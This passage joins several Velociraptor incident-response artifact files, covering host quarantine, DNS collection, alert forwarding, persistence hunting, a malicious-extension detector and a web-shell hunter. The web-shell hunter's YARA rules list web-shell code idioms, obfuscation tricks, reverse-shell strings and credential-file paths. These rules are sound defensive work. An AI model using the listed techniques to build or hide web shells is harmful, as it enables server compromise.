      LET DockerChainExists = SELECT ReturnCode FROM execve(argv=['iptables', '-nL', 'DOCKER-USER']) WHERE ReturnCode = 0

      LET DockerDrop = SELECT if(condition=DockerChainExists, then={SELECT * FROM execve(argv=['iptables', '-I', 'DOCKER-USER', '-j', 'DROP'])}) FROM scope()

      LET ForwardDrop = SELECT * FROM execve(argv=['iptables', '-P', 'FORWARD', 'DROP'])

      LET OutputDrop = SELECT * FROM execve(argv=['iptables', '-P', 'OUTPUT', 'DROP'])

      SELECT if(condition=IptablesExists,
          then=if(condition=RemovePolicy,
              then=RemoveQuarantine,
              else={ SELECT * FROM chain(
                          a=NotifyUsers,
                          b=RuleBackup,
                          c=InputAllow,
                          d=ForwardAllow,
                          e=OutputAllow,
                          f=InputDrop,
                          g=DockerDrop,
                          h=ForwardDrop,
                          i=OutputDrop
                      )
                  }
          ),
          else=log(message="Iptables not found. Only Iptables-based quarantine is supported for Linux hosts at this time.")
      ) AS Quarantine FROM scope()

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.ETW.DNSOfflineCollector.yaml
======
name: Windows.ETW.DNSOfflineCollector
author: Jos Clephas - @DfirJos
description: |
  This artifact collects DNS queries for a specified duration. It can be used 
  with an Offline Collector (which is not the case with Windows.ETW.DNS).
  It uses the artifact (Windows.ETW.DNS) that was built by Matt Green - @mgreen27
parameters:
  - name: duration
    default: 60
    type: int
  - name: arg_ImageRegex
    description: "ImagePath regex filter for"
    default: .
    type: regex
  - name: arg_CommandLineRegex
    description: "Commandline to filter for."
    default: .
    type: regex
  - name: arg_QueryRegex
    description: "DNS query request (domain) to filter for."
    default: .
    type: regex
  - name: arg_AnswerRegex
    description: "DNS answer to filter for."
    default: .
    type: regex
  - name: arg_CommandLineExclusion
    description: "Commandline to filter out. Typically we do not want Dnscache events."
    default: svchost.exe -k NetworkService -p -s Dnscache$
    type: regex

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      SELECT * FROM collect(artifacts='Windows.ETW.DNS', timeout=duration, args=dict(`Windows.ETW.DNS`=dict(
            ImageRegex=arg_ImageRegex,
            CommandLineRegex=arg_CommandLineRegex,
            QueryRegex=arg_QueryRegex,
            AnswerRegex=arg_AnswerRegex,
            CommandLineExclusion=arg_CommandLineExclusion))) 

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Alerts.Monitor.IRIS.yaml
======
name: Server.Alerts.Monitor.IRIS
description: |
   Create an IRIS alert when monitored artifacts complete with results. Alerts are available starting in version 2.1.0 of IRIS.
   https://github.com/dfir-iris/iris-web/releases/tag/v2.1.0
  
   Learn more about IRIS, here: https://dfir-iris.org/
  
   It is recommended to use the Server Metadata section to store credentials, instead of having to store directly inside the artifact.

type: SERVER_EVENT

author: Wes Lambert - @therealwlambert

parameters:
  - name: IrisURL
    default: 
  - name: IrisKey
    type: string
    description: API key for DFIR-IRIS. Leave blank here if using server metadata store.
    default:
  - name: VeloServerURL
    default: 
  - name: ArtifactsToAlertOn
    default: .
    type: regex
  - name: DisableSSLVerify
    type: bool
    default: true
  - name: Customer
    default: 1
  - name: Severity 
    default: 1
  - name: Status 
    default: 1
    
sources:
  - query: |
      LET URL <= if(
            condition=IrisURL,
            then=IrisURL,
            else=server_metadata().IrisURL)
      LET Creds = if(
           condition=IrisKey,
           then=IrisKey,
           else=server_metadata().IrisKey)
      LET FlowInfo = SELECT timestamp(epoch=Timestamp) AS Timestamp,
             client_info(client_id=ClientId).os_info.fqdn AS FQDN,
             ClientId, FlowId, Flow.artifacts_with_results[0] AS FlowResults
      FROM watch_monitoring(artifact="System.Flow.Completion")
      WHERE Flow.artifacts_with_results =~ ArtifactsToAlertOn
      
      SELECT * from foreach(row=FlowInfo,
        query={
             SELECT ClientId, FlowId, FQDN, parse_json(data=Content).data.alert_title AS Alert, parse_json(data=Content).data.alert_id AS AlertID  
             FROM http_client(
                data=serialize(item=dict(
                    alert_title=format(format="Hit on %v for %v", args=[FlowResults, FQDN]), 
                    alert_description=format(format="ClientId: %v\n\nFlowID: %v\n\nURL: %v//app/index.html?#/collected/%v/%v", args=[ClientId, FlowId, config.server_urls[0], ClientId, FlowId,]),
                    alert_severity_id=Severity,
                    alert_status_id=Status,
                    alert_customer_id=Customer)),
                headers=dict(`Content-Type`="application/json", `Authorization`=format(format="Bearer %v", args=[Creds])),
                disable_ssl_security=DisableSSLVerify,
                method="POST",
                url=format(format="%v/alerts/add", args=[URL]))})

---END OF FILE---

======
FILE: /content/exchange/artifacts/Trawler.yaml
======
name: Windows.Forensics.Trawler
description: |
  Trawler [https://github.com/joeavanzato/Trawler] is a PowerShell script designed to help Incident
  Responders rapidly identify potential adversary persistence mechanisms on Windows.  It is similar
  in nature to PersistenceSniper with additional targeted checks as well as the capability to operate
  against a 'dead box' (mounted drive). The output is simplified compared to PersistenceSniper, providing
  the user with the details needed to kick off an investigation into any identified mechanisms.
  Think of these tools as autoruns on steroids.

  Please ensure the Velociraptor binary (and child powershell process) are excluded in any EDR/AV products.

author: Joe Avanzato

parameters:
  - name: UploadResults
    type: bool
    default: true

tools:
  - name: Trawler
    url: https://github.com/joeavanzato/Trawler/releases/download/1_0_0/trawler_release_v1_0_0.zip
    expected_hash: efade9e0e6d228c118c4c28de2e45c37ae2fa4973283d5f851e6c62c7b72f53b

type: Client

precondition: SELECT OS From info() where OS = 'windows'

sources:
    - query: |
       LET TmpDir <= tempdir(remove_last='Y')

       LET TrawlerZIP <= SELECT FullPath FROM Artifact.Generic.Utils.FetchBinary(ToolName="Trawler", IsExecutable=FALSE)

       LET _ <= SELECT * FROM unzip(filename=TrawlerZIP.FullPath, output_directory=TmpDir)

       LET TrawlerLocation = path_join(components=[TmpDir, 'trawler.ps1'], path_type='windows')

       LET TrawlerOutput <= path_join(components=[TmpDir + '\\detections.csv'], path_type='windows')
       LET TrawlerOutputPath = '"' + TrawlerOutput.Path + '"'

       LET cmdline <= join(
           array=[TrawlerLocation, '-outpath', TrawlerOutputPath],
           sep=' ')

       LET _ <= SELECT *
         FROM execve(
           argv=["powershell", "-ExecutionPolicy", "bypass", "-command", cmdline])

       LET LocalUploadTrawlerRecords = SELECT *
         FROM parse_csv(filename=TrawlerOutput)

       LET UploadTrawlerRecords = SELECT *, upload(file=TrawlerOutput) AS Upload
                         FROM LocalUploadTrawlerRecords

       SELECT *
       FROM if(
         condition=UploadResults,
         then=UploadTrawlerRecords,
         else=LocalUploadTrawlerRecords)

---END OF FILE---

======
FILE: /content/exchange/artifacts/Detection.Application.CursedChrome.yaml
======
name: Detection.Application.CursedChrome
author: Matt Dri - @mattdri-ir
description: |
   Detects the [Cursed Chrome](https://github.com/mandatoryprogrammer/CursedChrome) extension. Starts by searching for permissive extensions configured within `Secure Preferences`. Locates the path of the extensions and scans using Yara.

type: CLIENT

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows' OR OS = 'darwin'

    query: |
        LET yaraScan = '''
        rule cursed_chrome
        {
            strings:
                $s0 = "new WebSocket(\"ws://"
                $s1 = "new WebSocket(\"wss://"
                $s2 = "[1e7]+-1e3+-4e3+-8e3+-1e11"
            condition:
                ($s0 or $s1) and $s2
        }
        '''
        
        LET ext = SELECT parse_json(data=read_file(filename=FullPath)).extensions.settings AS ext
          FROM glob(
            globs=['''*:\Users\*\AppData\Local\Google\Chrome\User Data\*\Secure Preferences''', '''/Users/*/Library/Application Support/Google/Chrome/*/Secure Preferences'''])
            
        LET ext_of_interest = SELECT _value.path AS path
          FROM flatten(
            query={
              SELECT _value
              FROM foreach(
                row={
                  SELECT items(item=ext) AS config
                  FROM ext
                },
                column=["config"])
            })
          WHERE _value.granted_permissions.api =~ "webRequest"
           and (_value.granted_permissions.explicit_host =~ "<all_urls>" or _value.granted_permissions.explicit_host =~ "https://*/*")
        
        SELECT *
        FROM foreach(
          row={
            SELECT FullPath
            FROM foreach(
              row={
                SELECT path
                FROM ext_of_interest
              },
              query={
                SELECT *
                FROM glob(root=path,
                          globs="**")
                WHERE NOT IsDir
              })
          },
          query={
            SELECT *
            FROM yara(files=FullPath,
                      rules=yaraScan)
          })



---END OF FILE---

======
FILE: /content/exchange/artifacts/Generic.Detection.WebShells.yaml
======
name: Generic.Detection.WebShells
author: Herbert Bärschneider @SEC Defence
description: |
    This artifact looks for evidence of a web shell being present on the system. It targets Windows and Linux hosts.
    The artifact should be run on web servers, be it dedicated web servers or systems with integrated web servers. 
    For such machines, find the root directory of the web server and change the artifact parameters as needed.

    Multiple indicators for web shells are used: 
    * files with suspicious strings commonly used in web shells
    * suspicious processes being spawned by the webserver process (Windows only)
    * recently created and changed files under the webroot directory
    False-positives might arise from web sites with remote code execution functionality willingly built in as well as recent changes to the served web sites.
    The artifact was envisioned for hunting after potential malicious activity, so noise should be expected with the output.

reference:
    - https://attack.mitre.org/techniques/T1505/003/
    - https://github.com/nsacyber/Mitigating-Web-Shells/blob/master/extended.webshell_detection.yara
    - https://car.mitre.org/analytics/CAR-2021-02-001/

type: CLIENT

parameters:
   - name: WindowsWebRoot 
     description: glob used to identify all files belonging to the web root on Windows; if you want to target a directory structure, don't forget to append "**"
     default: "C:\\inetpub\\wwwroot\\**"
   - name: LinuxWebRoot
     description: glob used to identify all files belonging to the web root on Linux; if you want to target a directory structure, don't forget to append "**"
     default: "/var/www/**"
   - name: WebshellRegex
     description: regex for filtering the files in the webroot when looking at file creations and modifications
     type: regex
     default: '\.php|\.asp|\.aspx|\.jsp|\.jar|\.ps1|\.sh'
   - name: WebserverProcessRegex
     description: regex of processes which are considered as web servers when searching for suspicious process creations
     type: regex
     default: 'w3wp\.exe|httpd\.exe|tomcat*\.exe|nginx\.exe'
   - name: SpawnedProcessRegex
     description: regex of processes, which are to be considered suspicious when spawned from a web server process 
     type: regex
     default: 'cmd\.exe|powershell\.exe|pwsh\.exe|net\.exe|net1\.exe|whoami\.exe|hostname\.exe|systeminfo\.exe|ipconfig\.exe'
   - name: DateAfter
     type: timestamp
   - name: DateBefore
     type: timestamp
   - name: YaraRule
     type: yara
     description: yara rule used to search for web shells
     default: |
        private rule b374k
        {
            meta:
            author = "Blair Gillam (@blairgillam)"

            strings:
                $string = "b374k"
                $password_var = "$s_pass"
                $default_password = "0de664ecd2be02cdd54234a0d1229b43"

            condition:
                any of them
        }

        private rule pas_tool
        {
            meta:
                author = "US CERT"

            strings:
                $php = "<?php"
                $base64decode = /\='base'\.\(\d+\*\d+\)\.'_de'\.'code'/ 
                $strreplace = "(str_replace("
                $md5 = ".substr(md5(strrev("
                $gzinflate = "gzinflate"
                $cookie = "_COOKIE"
                $isset = "isset"

            condition:
                (filesize > 20KB and filesize < 22KB) and
                #cookie == 2 and
                #isset == 3 and
                all of them
        }

        private rule pbot
        {
            meta:
                author = "Jacob Baines (Tenable)"

            strings:
                $ = "class pBot" ascii
                $ = "function start(" ascii
                $ = "PING" ascii
                $ = "PONG" ascii

            condition:
                all of them
        }

        private rule passwordProtection
        {
            meta:
                source = "https://github.com/nbs-system/php-malware-finder"
                
            strings:
                $md5 = /md5\s*\(\s*\$_(GET|REQUEST|POST|COOKIE|SERVER)[^)]+\)\s*===?\s*['"][0-9a-f]{32}['"]/ nocase
                $sha1 = /sha1\s*\(\s*\$_(GET|REQUEST|POST|COOKIE|SERVER)[^)]+\)\s*===?\s*['"][0-9a-f]{40}['"]/ nocase
            condition:
                (any of them) 
        }

        private rule ObfuscatedPhp
        {
            meta:
                source = "https://github.com/nbs-system/php-malware-finder"
                
            strings:
                $eval = /(<\?php|[;{}])[ \t]*@?(eval|preg_replace|system|assert|passthru|(pcntl_)?exec|shell_exec|call_user_func(_array)?)\s*\(/ nocase  // ;eval( <- this is dodgy
                $eval_comment = /(eval|preg_replace|system|assert|passthru|(pcntl_)?exec|shell_exec|call_user_func(_array)?)\/\*[^\*]*\*\/\(/ nocase  // eval/*lol*/( <- this is dodgy
                $b374k = "'ev'.'al'"
                $align = /(\$\w+=[^;]*)*;\$\w+=@?\$\w+\(/  //b374k
                $weevely3 = /\$\w=\$[a-zA-Z]\('',\$\w\);\$\w\(\);/  // weevely3 launcher
                $c99_launcher = /;\$\w+\(\$\w+(,\s?\$\w+)+\);/  // http://bartblaze.blogspot.fr/2015/03/c99shell-not-dead.html
                $nano = /\$[a-z0-9-_]+\[[^]]+\]\(/ //https://github.com/UltimateHackers/nano
                $ninja = /base64_decode[^;]+getallheaders/ //https://github.com/UltimateHackers/nano
                $variable_variable = /\${\$[0-9a-zA-z]+}/
                $too_many_chr = /(chr\([\d]+\)\.){8}/  // concatenation of more than eight `chr()`
                $concat = /(\$[^\n\r]+\.){5}/  // concatenation of more than 5 words
                $concat_with_spaces = /(\$[^\n\r]+\. ){5}/  // concatenation of more than 5 words, with spaces
                $var_as_func = /\$_(GET|POST|COOKIE|REQUEST|SERVER)\s*\[[^\]]+\]\s*\(/
                $comment = /\/\*([^*]|\*[^\/])*\*\/\s*\(/  // eval /* comment */ (php_code)
        condition:
                (any of them)
        }

        private rule DodgyPhp
        {
            meta:
                source = "https://github.com/nbs-system/php-malware-finder"
                
            strings:
                $basedir_bypass = /curl_init\s*\(\s*["']file:\/\// nocase
                $basedir_bypass2 = "file:file:///" // https://www.intelligentexploit.com/view-details.html?id=8719
                $disable_magic_quotes = /set_magic_quotes_runtime\s*\(\s*0/ nocase

                $execution = /\b(eval|assert|passthru|exec|include|system|pcntl_exec|shell_exec|base64_decode|`|array_map|ob_start|call_user_func(_array)?)\s*\(\s*(base64_decode|php:\/\/input|str_rot13|gz(inflate|uncompress)|getenv|pack|\\?\$_(GET|REQUEST|POST|COOKIE|SERVER))/ nocase  // function that takes a callback as 1st parameter
                $execution2 = /\b(array_filter|array_reduce|array_walk(_recursive)?|array_walk|assert_options|uasort|uksort|usort|preg_replace_callback|iterator_apply)\s*\(\s*[^,]+,\s*(base64_decode|php:\/\/input|str_rot13|gz(inflate|uncompress)|getenv|pack|\\?\$_(GET|REQUEST|POST|COOKIE|SERVER))/ nocase  // functions that takes a callback as 2nd parameter
                $execution3 = /\b(array_(diff|intersect)_u(key|assoc)|array_udiff)\s*\(\s*([^,]+\s*,?)+\s*(base64_decode|php:\/\/input|str_rot13|gz(inflate|uncompress)|getenv|pack|\\?\$_(GET|REQUEST|POST|COOKIE|SERVER))\s*\[[^]]+\]\s*\)+\s*;/ nocase  // functions that takes a callback as 2nd parameter

                $htaccess = "SetHandler application/x-httpd-php"
                $iis_com = /IIS:\/\/localhost\/w3svc/
                $include = /include\s*\(\s*[^\.]+\.(png|jpg|gif|bmp)/  // Clever includes
                $ini_get = /ini_(get|set|restore)\s*\(\s*['"](safe_mode|open_basedir|disable_(function|classe)s|safe_mode_exec_dir|safe_mode_include_dir|register_globals|allow_url_include)/ nocase
                $register_function = /register_[a-z]+_function\s*\(\s*['"]\s*(eval|assert|passthru|exec|include|system|shell_exec|`)/  // https://github.com/nbs-system/php-malware-finder/issues/41
                $safemode_bypass = /\x00\/\.\.\/|LD_PRELOAD/
                $shellshock = /\(\)\s*{\s*[a-z:]\s*;\s*}\s*;/
                $udp_dos = /fsockopen\s*\(\s*['"]udp:\/\// nocase
                $various = "<!--#exec cmd="  //http://www.w3.org/Jigsaw/Doc/User/SSI.html#exec
                $at_eval = /@eval\s*\(/ nocase
                $double_var = /\${\s*\${/
                $extract = /extract\s*\(\s*\$_(GET|POST|REQUEST|COOKIE|SERVER)/
                $reversed = /noitcnuf_etaerc|metsys|urhtssap|edulcni|etucexe_llehs/ nocase
                        $silenced_include =/@\s*include\s*/ nocase

            condition:
                (any of them)
        }

        private rule DangerousPhp
        {
            meta:
                source = "https://github.com/nbs-system/php-malware-finder"
                
            strings:
                $system = "system" fullword nocase  // localroot bruteforcers have a lot of this

                $ = "array_filter" fullword nocase
                $ = "assert" fullword nocase
                $ = "backticks" fullword nocase
                $ = "call_user_func" fullword nocase
                $ = "eval" fullword nocase
                $ = "exec" fullword nocase
                $ = "fpassthru" fullword nocase
                $ = "fsockopen" fullword nocase
                $ = "function_exists" fullword nocase
                $ = "getmygid" fullword nocase
                $ = "shmop_open" fullword nocase
                $ = "mb_ereg_replace_callback" fullword nocase
                $ = "passthru" fullword nocase
                $ = /pcntl_(exec|fork)/ fullword nocase
                $ = "php_uname" fullword nocase
                $ = "phpinfo" fullword nocase
                $ = "posix_geteuid" fullword nocase
                $ = "posix_getgid" fullword nocase
                $ = "posix_getpgid" fullword nocase
                $ = "posix_getppid" fullword nocase
                $ = "posix_getpwnam" fullword nocase
                $ = "posix_getpwuid" fullword nocase
                $ = "posix_getsid" fullword nocase
                $ = "posix_getuid" fullword nocase
                $ = "posix_kill" fullword nocase
                $ = "posix_setegid" fullword nocase
                $ = "posix_seteuid" fullword nocase
                $ = "posix_setgid" fullword nocase
                $ = "posix_setpgid" fullword nocase
                $ = "posix_setsid" fullword nocase
                $ = "posix_setsid" fullword nocase
                $ = "posix_setuid" fullword nocase
                $ = "preg_replace_callback" fullword
                $ = "proc_open" fullword nocase
                $ = "proc_close" fullword nocase
                $ = "popen" fullword nocase
                $ = "register_shutdown_function" fullword nocase
                $ = "register_tick_function" fullword nocase
                $ = "shell_exec" fullword nocase
                $ = "shm_open" fullword nocase
                $ = "show_source" fullword nocase
                $ = "socket_create(AF_INET, SOCK_STREAM, SOL_TCP)" nocase
                $ = "stream_socket_pair" nocase
                $ = "suhosin.executor.func.blacklist" nocase
                $ = "unregister_tick_function" fullword nocase
                $ = "win32_create_service" fullword nocase
                $ = "xmlrpc_decode" fullword nocase 
                $ = /ob_start\s*\(\s*[^\)]/  //ob_start('assert'); echo $_REQUEST['pass']; ob_end_flush();

                $whitelist = /escapeshellcmd|escapeshellarg/ nocase

            condition:
                (not $whitelist and (5 of them or #system > 250))
        }

        private rule IRC
        {
            meta:
                source = "https://github.com/nbs-system/php-malware-finder"
                
            strings:
                $ = "USER" fullword nocase
                $ = "PASS" fullword nocase
                $ = "PRIVMSG" fullword nocase
                $ = "MODE" fullword nocase
                $ = "PING" fullword nocase
                $ = "PONG" fullword nocase
                $ = "JOIN" fullword nocase
                $ = "PART" fullword nocase

            condition:
                5 of them
        }

        private rule base64_strings
        {
            meta:
                source = "https://github.com/nbs-system/php-malware-finder"
                
            strings:
                $user_agent = "SFRUUF9VU0VSX0FHRU5UCg"
                $eval = "ZXZhbCg"
                $system = "c3lzdGVt"
                $preg_replace = "cHJlZ19yZXBsYWNl"
                $exec = "ZXhlYyg"
                $base64_decode = "YmFzZTY0X2RlY29kZ"
                $perl_shebang = "IyEvdXNyL2Jpbi9wZXJsCg"
                $cmd_exe = "Y21kLmV4ZQ"
                $powershell = "cG93ZXJzaGVsbC5leGU"

            condition:
                any of them
        }

        private rule hex
        {
            meta:
                source = "https://github.com/nbs-system/php-malware-finder"
                
            strings:
                $globals = "\\x47\\x4c\\x4f\\x42\\x41\\x4c\\x53" nocase
                $eval = "\\x65\\x76\\x61\\x6C\\x28" nocase
                $exec = "\\x65\\x78\\x65\\x63" nocase
                $system = "\\x73\\x79\\x73\\x74\\x65\\x6d" nocase
                $preg_replace = "\\x70\\x72\\x65\\x67\\x5f\\x72\\x65\\x70\\x6c\\x61\\x63\\x65" nocase
                $http_user_agent = "\\x48\\124\\x54\\120\\x5f\\125\\x53\\105\\x52\\137\\x41\\107\\x45\\116\\x54" nocase
                $base64_decode = "\\x61\\x73\\x65\\x36\\x34\\x5f\\x64\\x65\\x63\\x6f\\x64\\x65\\x28\\x67\\x7a\\x69\\x6e\\x66\\x6c\\x61\\x74\\x65\\x28" nocase
            
            condition:
                any of them
        }

        private rule Hpack
        {
            meta:
                source = "https://github.com/nbs-system/php-malware-finder"
                
            strings:
                $globals = "474c4f42414c53" nocase
                $eval = "6576616C28" nocase
                $exec = "65786563" nocase
                $system = "73797374656d" nocase
                $preg_replace = "707265675f7265706c616365" nocase
                $base64_decode = "61736536345f6465636f646528677a696e666c61746528" nocase
            
            condition:
                any of them
        }

        private rule strrev
        {
            meta:
                source = "https://github.com/nbs-system/php-malware-finder"
                
            strings:
                $globals = "slabolg" nocase fullword
                $preg_replace = "ecalper_gerp" nocase fullword
                $base64_decode = "edoced_46esab" nocase fullword
                $gzinflate = "etalfnizg" nocase fullword
            
            condition:
                any of them
        }


        private rule SuspiciousEncoding
        {
            meta:
                source = "https://github.com/nbs-system/php-malware-finder"
                
            condition:
                (base64_strings or hex or strrev or Hpack)
        }

        private rule DodgyStrings
        {
            meta:
                source = "https://github.com/nbs-system/php-malware-finder"
                
            strings:
                $ = ".bash_history"
                $ = "404 not found" nocase
                $ = "file not found" nocase
                $ = "forbidden" nocase
                $ = /AddType\s+application\/x-httpd-(php|cgi)/ nocase
                $ = /php_value\s*auto_prepend_file/ nocase
                $ = /SecFilterEngine\s+Off/ nocase  // disable modsec
                $ = /Add(Handler|Type|OutputFilter)\s+[^\s]+\s+\.htaccess/ nocase
                $ = ".mysql_history"
                $ = ".ssh/authorized_keys"
                $ = "/(.*)/e"  // preg_replace code execution
                $ = "/../../../"
                $ = "/etc/passwd"
                $ = "/etc/proftpd.conf"
                $ = "/etc/resolv.conf"
                $ = "/etc/shadow"
                $ = "/etc/syslog.conf"
                $ = "/proc/cpuinfo" fullword
                $ = "/var/log/lastlog"
                $ = "/windows/system32/"
                $ = "LOAD DATA LOCAL INFILE" nocase
                $ = "WScript.Shell"
                $ = "WinExec"
                $ = "b374k" fullword nocase
                $ = "backdoor" fullword nocase
                $ = /(c99|r57|fx29)shell/
                $ = "cmd.exe" fullword nocase
                $ = "powershell.exe" fullword nocase
                $ = /defac(ed|er|ement|ing)/ fullword nocase
                $ = "evilc0ders" fullword nocase
                $ = "exploit" fullword nocase
                $ = "find . -type f" fullword
                $ = "hashcrack" nocase
                $ = "id_rsa" fullword
                $ = "ipconfig" fullword nocase
                $ = "kernel32.dll" fullword nocase
                $ = "kingdefacer" nocase
                $ = "Wireghoul" nocase fullword
                $ = "LD_PRELOAD" fullword
                $ = "libpcprofile"  // CVE-2010-3856 local root
                $ = "locus7s" nocase
                $ = "ls -la" fullword
                $ = "meterpreter" fullword
                $ = "nc -l" fullword
                $ = "netstat -an" fullword
                $ = "php://"
                $ = "ps -aux" fullword
                $ = "rootkit" fullword nocase
                $ = "slowloris" fullword nocase
                $ = "suhosin" fullword
                $ = "sun-tzu" fullword nocase // quote from the Art of War
                $ = /trojan (payload)?/
                $ = "uname -a" fullword
                $ = "visbot" nocase fullword
                $ = "warez" fullword nocase
                $ = "whoami" fullword
                $ = /(r[e3]v[e3]rs[e3]|w[3e]b|cmd)\s*sh[e3]ll/ nocase
                $ = /-perm -0[24]000/ // find setuid files
                $ = /\/bin\/(ba)?sh/ fullword
                $ = /hack(ing|er|ed)/ nocase
                $ = /(safe_mode|open_basedir) bypass/ nocase
                $ = /xp_(execresultset|regenumkeys|cmdshell|filelist)/

                $vbs = /language\s*=\s*vbscript/ nocase
                $asp = "scripting.filesystemobject" nocase

            condition:
                (IRC or 2 of them)
        }

        private rule generic_jsp
        {
            meta:
                source= "https://www.tenable.com/blog/hunting-for-web-shells"

            strings:
                $ = /Runtime.getRuntime\(\).exec\(request.getParameter\(\"[a-zA-Z0-9]+\"\)\);/ ascii

            condition:
                all of them
        }

        private rule eval
        {
            meta:
                source = "https://www.tenable.com/blog/hunting-for-web-shells"

            strings:
                $ = /eval[\( \t]+((base64_decode[\( \t]+)|(str_rot13[\( \t]+)|(gzinflate[\( \t]+)|(gzuncompress[\( \t]+)|(strrev[\( \t]+)|(gzdecode[\( \t]+))+/

            condition:
                all of them
        }

        private rule fopo
        {
            meta:
                source = "https://github.com/tenable/yara-rules/blob/master/webshells/"

            strings:
                $ = /\$[a-zA-Z0-9]+=\"\\(142|x62)\\(141|x61)\\(163|x73)\\(145|x65)\\(66|x36)\\(64|x34)\\(137|x5f)\\(144|x64)\\(145|x65)\\(143|x63)\\(157|x6f)\\(144|x64)\\(145|x65)\";@eval\(/

            condition:
                all of them
        }

        private rule hardcoded_urldecode
        {
            meta:
                source = "https://github.com/tenable/yara-rules/blob/master/webshells/"

            strings:
                $ = /urldecode[\t ]*\([\t ]*'(%[0-9a-fA-F][0-9a-fA-F])+'[\t ]*\)/

            condition:
                all of them
        }

        private rule chr_obfuscation
        {
            meta:
                source = "https://github.com/tenable/yara-rules/blob/master/webshells/"

            strings:
                $ = /\$[^=]+=[\t ]*(chr\([0-9]+\)\.?){2,}/

            condition:
                all of them
        }

        private rule phpInImage
        {
            meta:
                source = "Vlad https://github.com/vlad-s"

            strings:
                $php_tag = "<?php"
                $gif = {47 49 46 38 ?? 61} // GIF8[version]a
                $jfif = { ff d8 ff e? 00 10 4a 46 49 46 }
                $png = { 89 50 4e 47 0d 0a 1a 0a }
                $jpeg = {FF D8 FF E0 ?? ?? 4A 46 49 46 } 

            condition:
                (($gif at 0) or ($jfif at 0) or ($png at 0) or ($jpeg at 0)) and $php_tag
        }

        rule hiddenFunctionality
        {
            meta:
                author = "NSA Cybersecurity"
                description = "Hidden functionality allows malware to masquerade as another filetype"

            condition:
                phpInImage
        }

        rule webshellArtifact 
        {
            meta:
                author = "NSA Cybersecurity"
                description = "Artifacts common to web shells and rare in benign files"

            condition:
                b374k or pas_tool or pbot or generic_jsp
        }

        rule suspiciousFunctionality
        {
            meta:
                author = "NSA Cybersecurity"
                description = "Artifacts common to web shells and somewhat rare in benign files"

            condition:
                passwordProtection or hardcoded_urldecode or fopo or eval
        }

        rule obfuscatedFunctionality
        {
            meta:
                author = "NSA Cybersecurity"
                description = "Obfuscation sometimes hides malicious functionality"

            condition:
                ObfuscatedPhp or chr_obfuscation or SuspiciousEncoding
        }

        rule possibleIndicator
        {
            meta:
                author = "NSA Cybersecurity"
                description = "Artifacts common to web shells and less common in benign files"

            condition:
                DodgyPhp or DangerousPhp or DodgyStrings
        }


        private rule APT_Backdoor_MSIL_SUNBURST_1
        {
            meta:
                author = "FireEye"
                description = "This rule is looking for portions of the SUNBURST backdoor that are vital to how it functions. The first signature fnv_xor matches a magic byte xor that the sample performs on process, service, and driver names/paths. SUNBURST is a backdoor that has the ability to spawn and kill processes, write and delete files, set and create registry keys, gather system information, and disable a set of forensic analysis tools and services."
                source = "https://github.com/fireeye/sunburst_countermeasures/blob/main/rules/SUNBURST/yara/APT_Backdoor_MSIL_SUNBURST_1.yar"
            
            strings:
                $cmd_regex_encoded = "U4qpjjbQtUzUTdONrTY2q42pVapRgooABYxQuIZmtUoA" wide
                $cmd_regex_plain = { 5C 7B 5B 30 2D 39 61 2D 66 2D 5D 7B 33 36 7D 5C 7D 22 7C 22 5B 30 2D 39 61 2D 66 5D 7B 33 32 7D 22 7C 22 5B 30 2D 39 61 2D 66 5D 7B 31 36 7D }
                $fake_orion_event_encoded = "U3ItS80rCaksSFWyUvIvyszPU9IBAA==" wide
                $fake_orion_event_plain = { 22 45 76 65 6E 74 54 79 70 65 22 3A 22 4F 72 69 6F 6E 22 2C }
                $fake_orion_eventmanager_encoded = "U3ItS80r8UvMTVWyUgKzfRPzEtNTi5R0AA==" wide
                $fake_orion_eventmanager_plain = { 22 45 76 65 6E 74 4E 61 6D 65 22 3A 22 45 76 65 6E 74 4D 61 6E 61 67 65 72 22 2C }
                $fake_orion_message_encoded = "U/JNLS5OTE9VslKqNqhVAgA=" wide
                $fake_orion_message_plain = { 22 4D 65 73 73 61 67 65 22 3A 22 7B 30 7D 22 }
                $fnv_xor = { 67 19 D8 A7 3B 90 AC 5B }
            condition:
                $fnv_xor and ($cmd_regex_encoded or $cmd_regex_plain) or ( ($fake_orion_event_encoded or $fake_orion_event_plain) and ($fake_orion_eventmanager_encoded or $fake_orion_eventmanager_plain) and ($fake_orion_message_encoded and $fake_orion_message_plain) )
        }

        private rule APT_Backdoor_MSIL_SUNBURST_2
        {
            meta:
                author = "FireEye"
                description = "The SUNBURST backdoor uses a domain generation algorithm (DGA) as part of C2 communications. This rule is looking for each branch of the code that checks for which HTTP method is being used. This is in one large conjunction, and all branches are then tied together via disjunction. The grouping is intentionally designed so that if any part of the DGA is re-used in another sample, this signature should match that re-used portion. SUNBURST is a backdoor that has the ability to spawn and kill processes, write and delete files, set and create registry keys, gather system information, and disable a set of forensic analysis tools and services."
                source = "https://github.com/fireeye/sunburst_countermeasures/blob/main/rules/SUNBURST/yara/APT_Backdoor_MSIL_SUNBURST_2.yar"
            
            strings:
                $a = "0y3Kzy8BAA==" wide
                $aa = "S8vPKynWL89PS9OvNqjVrTYEYqNa3fLUpDSgTLVxrR5IzggA" wide
                $ab = "S8vPKynWL89PS9OvNqjVrTYEYqPaauNaPZCYEQA=" wide
                $ac = "C88sSs1JLS4GAA==" wide
                $ad = "C/UEAA==" wide
                $ae = "C89MSU8tKQYA" wide
                $af = "8wvwBQA=" wide
                $ag = "cyzIz8nJBwA=" wide
                $ah = "c87JL03xzc/LLMkvysxLBwA=" wide
                $ai = "88tPSS0GAA==" wide
                $aj = "C8vPKc1NLQYA" wide
                $ak = "88wrSS1KS0xOLQYA" wide
                $al = "c87PLcjPS80rKQYA" wide
                $am = "Ky7PLNAvLUjRBwA=" wide
                $an = "06vIzQEA" wide
                $b = "0y3NyyxLLSpOzIlPTgQA" wide
                $c = "001OBAA=" wide
                $d = "0y0oysxNLKqMT04EAA==" wide
                $e = "0y3JzE0tLknMLQAA" wide
                $f = "003PyU9KzAEA" wide
                $h = "0y1OTS4tSk1OBAA=" wide
                $i = "K8jO1E8uytGvNqitNqytNqrVA/IA" wide
                $j = "c8rPSQEA" wide
                $k = "c8rPSfEsSczJTAYA" wide
                $l = "c60oKUp0ys9JAQA=" wide
                $m = "c60oKUp0ys9J8SxJzMlMBgA=" wide
                $n = "8yxJzMlMBgA=" wide
                $o = "88lMzygBAA==" wide
